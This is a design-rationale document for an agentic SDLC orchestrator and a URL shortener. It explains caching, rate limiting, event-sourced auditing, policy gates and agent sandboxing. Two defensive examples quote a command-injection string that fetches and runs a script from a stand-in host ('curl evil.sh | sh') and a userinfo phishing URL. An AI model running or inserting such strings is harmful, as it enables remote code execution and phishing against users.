# DESIGN RATIONALE — Agentic SDLC Orchestrator + URL Shortener

> Companion to `BUILD_PLAN.md`. This document explains **why** each decision was made: the alternatives, the trade-offs and the risks. It is written to be defended in a review. Section numbers are referenced from the plan and ADRs.

---

## 1. Problem Framing

### 1.1 What is actually being evaluated
The URL shortener is the **target system**. The **orchestrator** is the product. The brief calls workflow orchestration the "critical differentiator" and asks for non-linear, stateful, governed execution "rather than simple linear task chaining". So the design puts most of its effort into:

1. A real **dependency graph** with gates, parallelism and joins (not a for-loop over prompts).
2. **State that survives** crashes and can be reconstructed and audited.
3. **Governance that cannot be bypassed by the agents themselves.**
4. **Evidence**: metrics, audit chain, lineage, scenario write-ups.

The shortener still has to be production-quality. It is what the agents modify, and a weak baseline would make the brownfield scenario meaningless.

### 1.2 Normalizing the brief
The brief mixes capabilities (understand, decompose), controls (retries, approvals) and evidence (metrics, audit). The plan splits these into FR/NFR (target system), OR (orchestrator) and D (deliverables) with IDs, so that every requirement maps to a step and a test (BUILD_PLAN §9). This is the same discipline we expect the RequirementsAgent to apply.

### 1.3 Ambiguities in the brief itself, and how we resolved them
| Ambiguity | Resolution | Why |
|---|---|---|
| "Working prototype": does it need a real LLM? | Live **and** replay modes | Graders may not have an API key. Determinism is needed for tests. |
| "Publish/release": deploy where? | Approved merge to local `main` | A real deploy adds infra but proves nothing extra about orchestration. |
| "Human approval": what identity? | API key with role APPROVER | Proves separation of duties without SSO scope creep. |
| "Analytics": how accurate? | Exact counts, approximate uniques (HLL), at-most-once | Standard industry trade-off. Stated explicitly. |
| "Brownfield": on what codebase? | Our own `baseline-v1` tag with a seeded defect | It gives a controlled, reproducible brownfield. |

---

## 2. Technology Stack: Why These Choices

### 2.1 Java 21 + Spring Boot
- **The IDE context**: you build in IntelliJ, and its Java tooling (refactoring, debugging, test runner) is the best-in-class.
- **Virtual threads (Java 21)** let parallel stages and blocking I/O (LLM calls, `mvn` processes, JDBC) run without reactive complexity. Parallel stage execution is a core requirement.
- **Records and sealed types** model states, events and artifacts as immutable values. The compiler checks exhaustive `switch` over sealed states, so state machine bugs become compile errors.
- **Spring Boot** gives production features for free: Actuator health/probes, Micrometer metrics, graceful shutdown, config binding, a mature test slice. That frees the time to go into orchestration.
- **One language for target and orchestrator**: the orchestrator's validation runs the same build tool the humans use. There is no polyglot overhead.

**Alternatives considered:**
- *Python + LangGraph/CrewAI.* Python has a richer agent ecosystem. But using a framework hides the orchestration logic that is the thing being evaluated. LangGraph also gives you graph-shaped prompting, not governance (policy engine, hash-chained audit, approvals with separation of duties). And it means two languages.
- *Temporal / Camunda.* These are excellent durable workflow engines. But they are heavy infrastructure for a 3-day prototype, and they would make the "design and implement an orchestration layer" requirement mostly configuration. The design deliberately keeps the same concepts (event-sourced history, deterministic coordinator, activities = agents), so migrating to Temporal later is straightforward. This is ADR-0005.
- *Node/TypeScript.* It's viable, but its concurrency and type-system guarantees for state machines are weaker, and the IntelliJ context favours Java.

### 2.2 Maven multi-module (not Gradle)
It is simpler and declarative. Claude Code edits POMs reliably, and IntelliJ imports it with no configuration. Modules enforce **boundaries**: `orchestrator-core` cannot import Spring because it isn't on its classpath, and ArchUnit double-checks.

### 2.3 PostgreSQL
- Transactions plus **unique constraints** are the final guard against duplicate codes and aliases.
- **Sequences** give a collision-free ID source for code generation.
- **JSONB** stores agent artifacts and event payloads flexibly while staying queryable.
- **Triggers** can make the audit table append-only at the DB level.
- `ON CONFLICT DO UPDATE` gives atomic counter upserts for daily click aggregates.
- *Why not a NoSQL store?* The access pattern (key → URL) suits KV stores, but we need relational integrity for the orchestrator and transactions for idempotency. At this scale a single Postgres instance does both. Section 8 covers scaling.

### 2.4 Redis
One dependency covers three jobs: the **L2 cache**, **distributed rate limiting** (atomic Lua) and **HyperLogLog** for unique visitors. It is optional at runtime: the service degrades but keeps working without it (NFR-2).

### 2.5 Caffeine (L1)
An in-process cache answers in nanoseconds, with no network hop. That matters most for viral links (hot keys). Caffeine's W-TinyLFU admission policy beats plain LRU on skewed workloads, which is exactly what link traffic looks like (a power-law distribution).

### 2.6 Spring Data JDBC (not JPA/Hibernate)
The domain is small and the queries are explicit. JPA's lazy loading, dirty checking and proxy behaviour add surprises and make SQL less predictable. JDBC keeps the hot redirect query obvious and tunable.

### 2.7 Resilience4j
It is lightweight and works with any function. It gives circuit breakers around Redis and the LLM, retries with backoff, and timeouts. We still use our own retry policy for *stage-level* retries, because those need domain semantics (failure classification, feedback injection, audit events) that a generic library doesn't have.

### 2.8 JGit (not shelling out to `git`)
Pure Java. It needs no git binary and leaves no shell-injection surface. Results come back as typed objects, which makes testing easier. The orchestrator's checkpoints and rollback depend on it.

### 2.9 The official Anthropic Java SDK behind a port
We use the official SDK to avoid hand-rolled HTTP. It sits behind the `LlmGateway` interface so that (a) replay mode can swap in, (b) the provider or model can change without touching agents, and (c) cost and token accounting sit in one place. The model is set in config, never hard-coded.

### 2.10 Testing stack
- **Testcontainers**: integration tests against *real* Postgres and Redis. Mocked databases miss SQL dialect, constraint and Lua script bugs.
- **jqwik**: property-based tests prove *invariants* (bijection, topological correctness) over thousands of random inputs. A handful of examples can't do that.
- **ArchUnit**: architecture rules become tests, so a module boundary can't erode silently, whether a human or an agent wrote the change.
- **JaCoCo gate**: coverage is a build-breaking gate, and the ValidationAgent uses the same gate. Humans and agents meet the same bar.

---

## 3. URL Shortener Design Decisions

### 3.1 Code generation: sequence → Feistel permutation → Base62 (ADR-0001)
**Requirements:** no collisions (NFR-5), not enumerable, short, O(1), no coordination between instances.

| Option | Collisions | Enumerable | Coordination | Verdict |
|---|---|---|---|---|
| Hash(URL) truncated (MD5/SHA → 7 chars) | **Yes**: birthday bound ≈ √(62⁷) ≈ 1.9 M links for 50 % odds of at least one collision | No | None | Needs a collision-retry loop. Rejected. |
| Random 7 chars + retry on unique violation | Rare, rising with fill ratio | No | DB round-trip per retry | Acceptable, but non-deterministic latency |
| Sequence → Base62 directly | None | **Yes** (abc0001, abc0002…) | DB sequence | Leaks volume and lets people scrape every link. Rejected. |
| **Sequence → keyed Feistel → Base62** | **None** (a bijection) | **No** (looks random without the key) | DB sequence (cached blocks) | **Chosen** |
| Snowflake IDs | None | Partially (time-ordered) | Worker ID allocation | Too long for 7 chars (64 bits ≈ 11 base62 chars) |

**How it works**
- **Base62** encodes an integer in the alphabet `[0-9a-zA-Z]`. 7 characters give 62⁷ ≈ 3.52 × 10¹² codes, about 3.5 trillion. At 100 M links/year that lasts 35,000 years. Encode and decode are O(L), with L = 7.
- **Feistel network**: split the number into two halves (L, R). Each round does `L' = R`, `R' = L XOR F(key, R)`. A Feistel network is **always invertible, whatever F is**. That is why it is a provable bijection (no collisions) while the output still looks random. F = truncated HMAC-SHA256, keyed by a secret. 4 rounds are enough for good scrambling; this is not encryption.
- **Cycle-walking**: the Feistel domain is 2⁴² ≈ 4.40 × 10¹², a little larger than 62⁷. If an output falls ≥ 62⁷, apply the permutation again until it lands in range. Because the permutation is a bijection on the larger set, this produces a bijection on the subset. The expected number of extra iterations is below 0.25.
- **Honesty about the security level**: this resists enumeration. It is not an access control. Anyone holding a short link can share it; that's inherent to shorteners. The key must stay secret, and rotating it changes the code space for *new* links only (old codes are stored, not recomputed).

**Custom aliases** are stored in the same `code` column with `custom_alias=true`. A unique constraint resolves races; the loser gets 409. Reserved words (`api`, `actuator`…) stop aliases from shadowing routes. Uniqueness is case-insensitive so that `MyLink` and `mylink` can't be used to confuse users.

### 3.2 HTTP 302 rather than 301 (ADR-0002)
- **301** is cached permanently by browsers. Later clicks never reach us, so analytics undercount, and **deletes and expiry can't take effect** for anyone who visited before.
- **302** (with `Cache-Control: private, max-age=0`) makes every click reach the service. The redirect status is configurable so a deployment can choose 301 for SEO-heavy, immutable links.
- The trade-off is more traffic to us. The two-level cache absorbs it.

### 3.3 Two-level cache with negative caching (ADR-0003)
- **Read path**: L1 Caffeine (≈ ns) → L2 Redis (≈ sub-ms) → Postgres (≈ ms). The traffic is read-heavy (redirects outnumber creates by 100:1 or more) and skewed, so this pays off.
- **Negative caching**: `not found` is cached for 60 s. Without it, a bot scanning random codes turns every request into a DB query, which is a cheap DoS vector. The short TTL bounds staleness when a code is created right after a miss. That is rare because codes are random.
- **Circuit breaker on Redis**: when Redis is slow, a 200 ms timeout on every request would wreck latency. Once the breaker opens, requests go straight to the DB until Redis recovers. The DB pool is sized for this (Hikari 20), and the breaker's half-open probe restores Redis automatically.
- **Invalidation**: the baseline deliberately **doesn't** evict on delete (BF-1). The brownfield fix evicts L2 and publishes a Redis pub/sub message so every instance evicts its L1. The residual risk is the L1 TTL (5 min) if a pub/sub message is lost. That is acceptable and documented. A stricter option would add a version check on L1 hit.
- **TTL alignment for expiry (brownfield)**: the cache entry TTL must be ≤ the time left until the link expires. Otherwise an expired link keeps redirecting from cache. The ImpactAnalysisAgent should spot this kind of cross-cutting data-flow issue.

### 3.4 Rate limiting: token bucket (DSA)
- **The algorithm**: a bucket holds up to C tokens and refills at r tokens/s. Each request takes one token; an empty bucket rejects. That allows **bursts up to C** while enforcing a long-run rate r. State is two numbers (tokens, lastRefillTs). Each check is O(1).
- **Why not a fixed window?** A fixed window allows 2× bursts at window edges. A sliding *log* is exact but costs O(n) memory per key. A sliding window counter approximates well, but the token bucket is the standard choice and matches the Retry-After semantics.
- **Atomicity**: read-refill-consume must be atomic across instances. A Redis **Lua script** runs atomically on the Redis server, which avoids race conditions without distributed locks.
- **Failure policy is per endpoint**, and that is a deliberate judgment call:
  - *Redirect* **fails open**: if the limiter errors we let traffic through, because blocking redirects would break every link. Abuse protection is weakened briefly; availability wins.
  - *Create* falls back to an **in-memory bucket**: still limited per instance (N instances ⇒ up to N× the limit). Creating links is the main abuse vector, so it needs some limit even when degraded.
- **Visitor fingerprint** = SHA-256(IP + UA + daily rotating salt). The limiter and unique counts work without storing raw IPs (privacy/GDPR), and the daily salt rotation stops long-term tracking.

### 3.5 Analytics: async, batched, at-most-once (ADR-0004)
- **Requirement conflict**: redirects must be fast (NFR-1), but every click should be recorded (FR-5). Writing to the DB synchronously on each click doubles latency and couples redirect availability to analytics write capacity.
- **Design**: the redirect thread does a **non-blocking `offer()`** into a **bounded `ArrayBlockingQueue`**. A single background writer drains it in **batches** (500 events or every 1 s, whichever comes first) and uses JDBC batch inserts. Batching turns N round-trips into roughly N/500.
- **Bounded, with a drop policy**: an unbounded queue under a traffic spike leads to an OOM, which takes down redirects too. Bounded plus drop keeps memory flat. Drops are **counted** (`analytics.events.dropped`) so the loss is visible, not silent.
- **Delivery semantics**: at-most-once. Events in memory are lost on a crash (graceful shutdown flushes). Getting exactly-once would need a durable log (Kafka, Redis Streams) plus idempotent consumers. The `ClickEventPublisher` port makes that a drop-in upgrade. This is written down as limitation L-3.
- **Pre-aggregation**: `click_daily` is upserted on write, so stats queries read ~90 rows instead of scanning millions of raw events. Raw `click_event` rows are kept for drill-down and re-aggregation. In production they would be partitioned by month.
- **Unique visitors with HyperLogLog**: counting distinct visitors exactly needs memory proportional to the number of visitors (a set). **HLL** estimates cardinality in **≤ 12 KB per key** with about **0.81 % standard error**, whatever the count. `PFCOUNT` over several day-keys returns the **union** cardinality, so range queries come out correct without double-counting a visitor seen on two days. The trade-off is approximate uniques, which is fine for marketing analytics. Billing would need exact counts.

### 3.6 URL validation and SSRF
A shortener is an **open redirect by design**, so the risks are (a) redirecting users to malicious content, which the ambiguous scenario's blocklist addresses, and (b) **SSRF** if anything server-side ever fetches the URL (previews, safety scanning, the QR feature's future link previews). Blocking private, loopback, link-local and multicast ranges at creation time is defence in depth. Known limitation: **DNS rebinding** (a host that resolves public at creation, private later). The full mitigation is to resolve and pin the IP at fetch time; we note it and don't fetch server-side in this prototype. `javascript:` and `data:` schemes are rejected (XSS through redirect). Userinfo (`user:pass@host`) is rejected because it is a classic phishing trick (`https://paypal.com@evil.com`).

### 3.7 Idempotency keys
Clients retry on timeouts. Without idempotency, one retry creates two links. We store `(key → request hash, response)` for 24 h:
- same key + same body → return the stored response (a safe retry),
- same key + a different body → **422**, because that is a client bug and silently returning a mismatched response is worse.
This follows the convention of payment APIs (e.g., Stripe-style idempotency).

### 3.8 Errors: RFC 9457 Problem Details
A standard machine-readable error format (`type`, `title`, `status`, `detail`) with stable `type` URIs. Clients, and the agents' TestAuthoringAgent, can assert on error *types* rather than brittle message strings.

### 3.9 Auth: API keys, hashed, compared in constant time
This is a prototype-appropriate level of security. Keys are stored as SHA-256 hashes, so a leaked config doesn't leak keys. Constant-time comparison prevents timing attacks. Redirects are public by design. OAuth2/OIDC is future work.

### 3.10 Health: readiness requires the DB, not Redis
If Redis being down failed readiness, Kubernetes would pull every pod out of rotation for a dependency we can live without. That is a self-inflicted outage. So readiness = DB up, and Redis status is *reported* as degraded.

---

## 4. Orchestrator Design Decisions (the core differentiator)

### 4.1 Workflow as data: a YAML DAG
- The workflow is **declarative configuration**, not code. Governance teams can review it, its **hash** is recorded per run (change control), and the stages can change without redeploying.
- It is validated at load time: unknown gates or agents and cycles are rejected **before** a run starts. That is fail-fast.
- *Why a DAG and not a state machine for the whole workflow?* SDLC stages have real partial-order dependencies (tests and docs don't depend on implementation; validation depends on both). A DAG expresses parallelism and joins naturally. A per-stage state machine handles each node's lifecycle. Combining both is the standard pattern (Airflow, Argo, Temporal-style).
- **Non-linearity** comes from four mechanisms: (1) parallel branches with joins, (2) conditional stages (`impact_analysis` only for brownfield), (3) bounded **loop-back** edges (validation → implementation), modelled as a controlled re-run rather than a graph cycle so the DAG stays acyclic and analysable, and (4) **dynamic expansion** (implementation fans out into per-task sub-nodes from the decomposition output) plus **re-planning**.

### 4.2 DAG algorithms (DSA)
| Operation | Algorithm | Complexity | Used for |
|---|---|---|---|
| Validate / order | **Kahn's algorithm** (repeatedly remove nodes with in-degree 0) | O(V + E) | Cycle detection at load and after expansion; topological order |
| Cycle explanation | DFS with a recursion stack (white/grey/black colouring) | O(V + E) | A human-readable cycle path in the error |
| Parallel layers | Kahn levels (BFS by in-degree waves) | O(V + E) | Visualisation; max-parallelism estimate |
| Readiness | Check every dependency is SUCCEEDED/SKIPPED (or keep in-degree counters) | O(deg) per completion | Scheduling: a node is READY once its deps are satisfied. **This is the join.** |
| Invalidation | **BFS** over forward edges from the changed node (downstream closure) | O(V + E) | Re-planning: everything derived from changed input is stale |
| Lineage | BFS over reverse edges and artifact input refs | O(V + E) | "Why does this artifact look like this?" |
| Expansion | Replace a node with a subgraph and rewire its roots and sinks | O(k + E) | Per-task implementation fan-out |

Why Kahn rather than DFS-based topological sort? Kahn yields **levels** (natural parallel waves) and detects cycles as a by-product (nodes left over). Its incremental in-degree view is exactly what the scheduler needs at runtime.

### 4.3 Single-writer coordinator plus parallel workers (ADR-0006)
- **The problem**: parallel stages finish at the same time. If every worker thread updates run state, you get races (a double-dispatched join, lost updates, an inconsistent audit order).
- **The solution**: the **actor / single-writer** pattern. One coordinator thread owns all state transitions and consumes commands from a queue. Workers (virtual threads) run agents and send `StageCompleted` and `StageFailed` messages back. State mutation never runs concurrently, so it needs no locks.
- This gives **deterministic event ordering**, which makes the hash chain and the replay meaningful. It is the same principle behind Temporal's deterministic workflow code and Redis's single-threaded core.
- The coordinator does no heavy work, so throughput is not a concern at this scale. Section 8 covers scaling out.

### 4.4 Stage state machine
An explicit transition table (`from × event → to`) makes illegal transitions exceptions rather than silent corruption, and the table is exhaustively testable. The states cover the brief's control vocabulary directly: `RETRYING`, `WAITING_APPROVAL`, `INVALIDATED` (re-plan), `ROLLED_BACK`, `HALTED` (safe-stop), `SKIPPED` (conditional path). `SKIPPED` counts as satisfying a dependency, so conditional branches don't block joins.

### 4.5 Gates: entry and exit
- **Entry gates** check preconditions ("is there input?", "is the upstream artifact schema-valid?"). They stop a stage running on garbage.
- **Exit gates** check postconditions ("is the build green?", "is every requirement covered by a task?"). They stop garbage from propagating.
- Gates are **deterministic code, not LLM judgment**. That is the core safety principle: *the LLM proposes; deterministic checks dispose*. An LLM saying "tests pass" counts for nothing. The ValidationAgent actually runs Maven and parses the Surefire XML.
- `taskGraph.everyRequirementCovered` is a **traceability gate**: every requirement ID must appear on at least one task. That catches the common LLM failure of silently dropping a requirement.

### 4.6 Event sourcing plus a hash chain (ADR-0007)
- **Event sourcing**: the append-only event log is the source of truth. Current state is a projection. This gives (1) **crash recovery**, by replaying the events, (2) a **complete audit trail by construction**, since you can't change state without an event, and (3) **time travel and debugging**: the state at any point can be reconstructed.
- **Hash chain**: `hash_n = SHA-256(hash_{n-1} ‖ canonical(event_n))`. Changing or deleting any past event breaks every later hash, so tampering is **evident** (the same idea as Git commits and certificate transparency logs). `audit/verify` recomputes the chain.
- **Canonical JSON** (sorted keys, no extra whitespace) is needed so that hashing is reproducible.
- **Defence in depth**: a DB trigger rejects UPDATE and DELETE on `workflow_event`. A hash chain is tamper-*evident*, not tamper-*proof*: an attacker with DB superuser rights could rewrite the whole chain. The production mitigation is to anchor the head hash periodically to external, write-once storage (WORM S3, a transparency log, a signed timestamp). That is limitation L-6.
- **Audit-grade** means each event records **who** (`agent:DesignAgent`, `human:alice`, `system`), **what**, **when**, **why** (gate reasons, policy matches, approval comments) and **with what inputs** (artifact references).

### 4.7 Artifacts, context and decision lineage
- Agents share context through **versioned artifacts** (blackboard pattern), not chat history. Each stage reads exactly the typed artifacts it declares. That keeps prompts small, makes inputs explicit and keeps stages independently re-runnable.
- **Lineage** records: inputs (artifact id + version), agent, model, **prompt hash** and rationale. "Which requirement version produced this code, under which design version and prompt?" can be answered precisely. Without that, re-planning is guesswork.
- Versions are never overwritten. Re-planning creates v2, and v1 stays in history. The ambiguous scenario shows this: spec v1 → answers → v2 → amendment → v3.

### 4.8 Policy engine and autonomy levels
- **Three outcomes**: ALLOW, REQUIRE_APPROVAL, DENY. They map to change-control practice (standard, normal and forbidden changes).
- **Combination rule**: deny overrides, then approval, then allow. It is monotonic, so adding a policy can only make things stricter. Easy to reason about.
- **Policies are evaluated on the action, not the intent**: the actual file path, diff content and command line, not what the agent says it will do. That defends against an agent (or a prompt-injected agent) misdescribing its action.
- **Agents cannot edit their own guardrails**: SEC-003 denies writes to `policies.yml`, `autonomy.yml` and orchestrator code. Without this, the agent's autonomy has no real boundary.
- **Policy snapshot per run**: the policy file hash is recorded at run start. Editing the policies mid-run doesn't affect running work. That is change control applied to the control system itself.
- **Autonomy levels (L0–L2)** let organizations dial in trust. **Invariants** are hard-coded, not configurable, because the brief's principle (humans own final quality) must not be one YAML edit away from disabled: publish always needs a human, DENY is never overridable, and approvers must be human.
- **The risk score** (0–100) gives approvers context ("risk 72: migration + pom change + 900 lines") and lets L2 skip low-risk design approvals.
- Why regex/glob policies and not OPA/Rego? OPA is the production-grade answer, but for a prototype a small typed engine is easier to explain and test. The `PolicyEngine` port allows swapping in OPA later.

### 4.9 Human approval checkpoints
- They come from two sources: **stage approvals** (scope, design, go/no-go, publish) and **action approvals** raised by policy (migration, dependency, blast radius). That covers both "the lifecycle needs sign-off" and "this specific action is risky".
- The **approval summary** carries the evidence (artifacts, diff stats, risk, matched policies) so the approver isn't approving blind. Rubber-stamping is a real governance failure mode.
- **Separation of duties**: an agent principal can't approve, and an OPERATOR can't approve. Only an APPROVER can.
- **A rejection is information, not a dead end**: the comment becomes feedback for the re-run, and downstream work is invalidated. Approvals on invalidated stages are **voided**, so a re-planned design must be re-approved. Without that, re-planning would be a governance bypass.
- Approval **wait time is measured separately** from agent latency, so human delay doesn't distort the system's reliability metrics.

### 4.10 Retries, fallback, rollback, safe-stop
- **Failure classification** decides the response:
  - *Transient* (timeout, 429, 5xx): retry with **exponential backoff + full jitter** (`sleep = random(0, min(cap, base·2^attempt))`). Jitter stops synchronized retry storms.
  - *Validation* (schema or gate failure): retry **with the failure fed back** to the agent. Retrying blindly with the same input usually fails the same way.
  - *Fatal* (policy DENY, illegal transition): **no retry**, since retrying a forbidden action is pointless and a little dangerous.
- **Bounded everywhere**: per-stage attempts, per-loop counts and per-run budgets (wall clock, LLM calls, tokens). Unbounded agent loops are the classic agentic failure (runaway cost, infinite fix-break cycles).
- **Fallback = graceful degradation of ambition**: when the full approach fails, try a *minimal patch* (narrower scope, single file). Then fail clearly rather than produce something half-done.
- **Rollback via git checkpoints**: each mutating stage commits on the agent branch. Rollback restores the checkpoint from before the earliest affected stage. This is the **saga** pattern (compensating actions), with git as the compensation mechanism. `main` is never touched until publish is approved, so the blast radius is always one branch.
- **Safe-stop** is a cooperative halt: stop dispatching, let running stages finish (or cancel after a grace period), checkpoint, persist. Then **resume** from the events. Triggers: the operator kill switch, budget exhaustion, or ≥ 3 policy denials in one run (a sign the agent is fighting the guardrails, which a human should look at).

### 4.11 Dynamic re-planning
- Triggers: amended requirements, a rejection with feedback, an upstream artifact that changed on re-run, or a changed task set.
- **The algorithm**: changed node → downstream closure (BFS) → invalidate → roll back to the earliest checkpoint → void affected approvals → reschedule. Work that is **not** downstream of the change is kept, which is the minimal re-execution.
- **Task-level diffing** on re-decomposition keeps succeeded tasks whose inputs are unchanged (matched by content hash), so a small requirement change doesn't redo everything.
- **Governance is preserved**: re-planning goes through the same gates, policies and approvals. Re-planning is never a path around a control.

### 4.12 Why validation is deterministic (ADR-0009)
LLMs are poor judges of their own output and prone to "it works" hallucinations. Every pass/fail decision that matters comes from **tools**: the compiler, the tests, the coverage XML, the policy regexes, diff stats. LLMs generate. Deterministic code verifies. Humans approve.

### 4.13 Test authoring separate from implementation
TestAuthoringAgent writes tests from the **spec and design**, in parallel and *without seeing the implementation*. Tests written from the code tend to mirror its bugs (confirmation bias). This also shows off the parallel and join mechanics.

### 4.14 Record/replay LLM mode (ADR-0008)
- **Determinism**: tests and demos give the same result every time.
- **Cost and access**: graders without API keys can run everything.
- **Regression**: a prompt change that changes the request hash shows up as a missing fixture. It doesn't silently drift.
- **Honesty**: replay demonstrates the *orchestration* faithfully. It doesn't prove the live LLM will produce the same output tomorrow. That is limitation L-1.

### 4.15 Sandboxed tools (defence against excessive agency)
- **Path jail** with canonicalization (it resolves `..` and symlinks) stops writes outside allowed paths.
- **Command allowlist with exact matches and no shell** blocks command injection like `mvn test; curl evil.sh | sh`.
- **Worktree per run** isolates runs from each other and from the human's working copy.
- **Timeouts plus process-tree kill**, so a hung build can't wedge the orchestrator.
- **Repo content is treated as data, never instructions**: prompts delimit code context, and policies apply regardless of what the content "asks". That defends against prompt injection planted in comments or docs (OWASP LLM01).

### 4.16 Reliability metrics: definitions
| Metric | Definition | Why it matters |
|---|---|---|
| Run success rate | completed / (completed + failed + halted) | Overall effectiveness |
| Stage success rate | succeeded on first attempt / executions, per stage | Shows the weakest agent or prompt |
| Retry rate | retries / executions | Prompt quality, flakiness |
| Rollback frequency | rollbacks / runs | How often the work had to be undone |
| **MTTR** | mean(time of first failure → next success of the same stage) | How fast the system self-heals |
| E2E latency | run created → completed (p50/p95), **excluding approval wait** reported separately | Throughput without hiding human time |
| Policy denials | count by policy id | Shows agents pushing against the guardrails |
| Token usage / cost | per run, per agent | Budget governance |

They are computed **from the event log**, so the metrics and the audit trail can never disagree.

---

## 5. Scenario Design: Why These Three

| Scenario | Exercises | Why it's convincing |
|---|---|---|
| **Greenfield: QR code** | Conditional skip (no impact analysis), parallel branches + join, dependency-change approval (CHG-002) | A small, self-contained feature. Shows a clean happy path with one real governance touchpoint. |
| **Brownfield: expiry + BF-1** | Impact analysis on a real codebase, migration approval, validation failure → loop-back, design reject → re-plan, policy DENY → fallback | It touches a schema, the cache, the API and data flows, and fixes a *pre-seeded, documented* bug. It shows codebase reasoning (spotting cache TTL vs expiry) plus every resilience control. |
| **Ambiguous: "abuse protection"** | Ambiguity detection, blocking clarification questions, human answers, mid-run amendment → re-plan with voided approvals, lineage across spec versions | "Safer" has at least three plausible meanings. The interesting behaviour is the system **refusing to guess** on blocking questions while stating defaults for non-blocking ones. |

Seeding the BF-1 defect on purpose is a methodological choice. A brownfield demo on code nobody knows is unverifiable. A known defect with a written description lets reviewers check whether the agent found and fixed the *actual* root cause.

---

## 6. Configuration Explained

### 6.1 Shortener
| Key | Value | Rationale |
|---|---|---|
| `code.length` | 7 | 3.5 T codespace. Short enough to type. |
| `code.secret` | env | Feistel key. Secret = non-enumerable. Never in git. |
| `code.feistel-rounds` | 4 | Enough mixing. More rounds cost CPU for no practical gain here. |
| `alias.min/max` | 4 / 32 | Under 4 risks colliding with the generated code space. A cap stops abuse. |
| `alias.reserved` | api, actuator… | Stops aliases shadowing routes. |
| `url.max-length` | 2048 | The de-facto browser and URL-handling limit. Stops storage abuse. |
| `block-private-networks` | true | SSRF defence. |
| `cache.l1-max-size` | 10,000 | ~a few MB of heap. Covers the hot set. |
| `cache.l1-ttl` | 5 min | Bounds staleness across instances if pub/sub invalidation is lost. |
| `cache.l2-ttl` | 24 h | Long, because the mapping is effectively immutable (except delete/expiry, handled explicitly). |
| `cache.negative-ttl` | 60 s | Stops scan-DoS. A short window bounds false "not found". |
| `redis timeout` | 200 ms | A slow cache is worse than no cache. Fail fast to the DB. |
| `hikari.maximum-pool-size` | 20 | Sized for the Redis-down fallback load. The connection timeout of 2 s fails fast. |
| `rate-limit.create` | 60/min/key | Generous for real users, tight for bulk spam. |
| `rate-limit.redirect` | 600/min/visitor | Blocks scraping and flooding without hurting real browsing. |
| `analytics.queue-capacity` | 10,000 | ~1–2 MB. Absorbs a burst of several seconds. |
| `analytics.batch-size / flush` | 500 / 1 s | Balances DB efficiency against freshness (stats about 1 s behind). |
| `redirect.status` | 302 | Section 3.2. |
| `threads.virtual.enabled` | true | Cheap concurrency for blocking I/O. |
| `server.shutdown` | graceful | Drains requests and flushes the analytics queue. |
| Circuit breaker `failure-rate 50 %, window 20, open 10 s` | — | Reacts within ~20 calls. Probes recovery every 10 s. |

### 6.2 Orchestrator
| Key | Value | Rationale |
|---|---|---|
| `budgets.maxWallClock` | 30 min | A run that takes longer has gone wrong. Stop and escalate. |
| `budgets.maxLlmCalls / maxTokens` | 60 / 400 k | Cost cap. Stops runaway loops. |
| `retry.maxAttempts` | 2 (impl: 3) | Implementation fails more often and is worth one more try. |
| `retry.baseDelay / maxDelay` | 2 s / 20 s | Covers short provider rate limits without stalling the run. |
| `validation.onFailure.maxLoops` | 2 | Fix-break-fix cycles beyond 2 rarely converge. Escalate to a human. |
| `CHG-003 max_files / lines` | 25 / 1,200 | A reviewable diff. Bigger changes need a human to look at the blast radius. |
| `CMD-001` exact allowlist | 2 commands | The minimal capability needed to validate. Nothing else. |
| `ORCH_LLM_MODE` | replay | A safe, free, deterministic default. |
| `ORCH_LLM_MODEL` | config | Swap models without code changes. A fallback model is configured too. |
| Default autonomy | L1_SUPERVISED | Agents act inside the path jail. Humans gate scope, design, release and risky actions. |

### 6.3 Environment and secrets
Secrets live only in environment variables (`.env`, git-ignored). `.env.example` documents them. API keys are stored as hashes. The LLM prompt redactor and the SEC-001 diff scan stop secrets leaving through prompts or commits.

---

## 7. Risk Register and Failure Scenarios

| # | Risk / failure scenario | Likelihood | Impact | Mitigation | Residual |
|---|---|---|---|---|---|
| R-1 | LLM generates code that compiles but is wrong | High | High | Spec-first tests written separately, coverage gate, human design and release approval | Logic gaps that tests don't cover |
| R-2 | Agent loops (fix → break → fix) | Med | Med | maxLoops = 2, budgets, safe-stop | Human time to resolve |
| R-3 | Prompt injection via repo content | Med | High | Policies act on actions, path jail, command allowlist, guardrail files write-denied | Subtle malicious logic in a patch → human review |
| R-4 | Secrets leaked into prompts or commits | Low | High | Redactor, SEC-001 scan, `.env` ignored | Novel secret formats |
| R-5 | Orchestrator crash mid-run | Med | Med | Event-sourced recovery, idempotent stage re-execution, checkpoints | In-flight LLM call repeated (cost) |
| R-6 | Audit tampering | Low | High | Hash chain, DB trigger | DB superuser rewriting the whole chain → external anchoring (future) |
| R-7 | Approval fatigue / rubber-stamping | Med | High | Risk-scored summaries, few, meaningful gates, L2 skips only low-risk design | Human behaviour |
| R-8 | Redis outage | Med | Med | Circuit breaker, DB fallback, local limiter, readiness ignores Redis | Higher DB load, per-instance limits |
| R-9 | Viral link hot key | Med | Med | L1 cache absorbs it, no network hop | — |
| R-10 | Code-space enumeration / scraping | Med | Low | Feistel permutation, redirect rate limit | Determined distributed scraping |
| R-11 | Malicious destination URLs (phishing) | High | High | Scheme and SSRF checks; ambiguous scenario adds a blocklist and flagging | No live threat-intel feed |
| R-12 | Analytics loss under overload | Med | Low | Bounded queue, drop counter, graceful flush | At-most-once by design |
| R-13 | Replay fixtures drift from live behaviour | Med | Med | Request-hash keys fail loudly; re-record procedure documented | Live outputs are non-deterministic |
| R-14 | Cache serving deleted/expired links (BF-1) | Seeded | Med | Brownfield fix: eviction + pub/sub + TTL alignment | L1 TTL window if pub/sub is lost |
| R-15 | DNS rebinding SSRF | Low | Med | No server-side fetch in the prototype | Resolve and pin needed if fetching is added |

---

## 8. Scalability Path (what changes at 100× and beyond)

| Concern | Prototype | At scale |
|---|---|---|
| Redirect reads | L1 + Redis + single Postgres | Read replicas, Redis cluster, CDN edge redirects for hot links |
| ID generation | One Postgres sequence (allocation size can batch IDs) | Block allocation per instance (hi/lo), or per-region sequence ranges |
| Analytics | In-process queue → Postgres | Kafka/Redis Streams → stream processor → ClickHouse/BigQuery |
| Rate limiting | Redis Lua | Same, sharded by key. Edge rate limiting (WAF) |
| Orchestrator | One coordinator for all runs | One coordinator **per run**, partitioned by run ID across nodes (runs are independent), or migrate to Temporal |
| Agents | Virtual threads in-process | Remote workers in sandboxed containers, a queue between coordinator and workers |
| Audit | Postgres + hash chain | Plus periodic external anchoring (WORM storage/transparency log) |

The design choices (ports and adapters, an event-sourced coordinator, stateless shortener instances) keep each of these a contained change, not a rewrite.

---

## 9. Engineering Principles Applied

